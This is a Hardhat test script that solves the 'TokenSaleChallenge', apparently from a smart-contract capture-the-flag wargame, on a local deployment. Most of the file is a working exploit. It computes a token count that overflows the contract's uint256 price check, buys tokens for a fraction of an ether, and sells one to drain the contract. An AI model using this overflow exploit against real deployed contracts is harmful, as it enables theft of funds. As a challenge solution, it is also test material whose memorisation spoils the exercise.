import { expect } from "chai";
import { ethers } from "hardhat";

describe("TokenSaleChallenge", () => {
  it("Solves the challenge", async () => {
    const accounts = await ethers.getSigners();
    const amount = ethers.parseEther("1");

    // deploy contract
    const factory = await ethers.getContractFactory("TokenSaleChallenge");
    const contract = await factory.deploy(accounts[0].address, {
      value: amount,
    });
    await contract.waitForDeployment();

    // overflow calculations
    const numNumerator = BigInt(2) ** BigInt(256);
    const numDenominator = BigInt(10) ** BigInt(18);
    const numResult = numNumerator / numDenominator + BigInt(1); // 115792089237316195423570985008687907853269984665640564039458

    const ethNumerator = BigInt(2) ** BigInt(256);
    const ethDenominator = BigInt(10) ** BigInt(18);
    const ethResult =
      (ethNumerator / ethDenominator + BigInt(1)) * ethDenominator -
      ethNumerator; // 415992086870360064

    console.log(
      "tokens:",
      numResult.toString(),
      "value:",
      ethResult.toString()
    );

    // logic to extract ether
    const buy = await contract.buy(numResult, {
      value: ethResult,
    });
    await buy.wait();

    const sell = await contract.sell(1);
    await sell.wait();

    expect(await contract.isComplete()).to.be.true;
  });
});
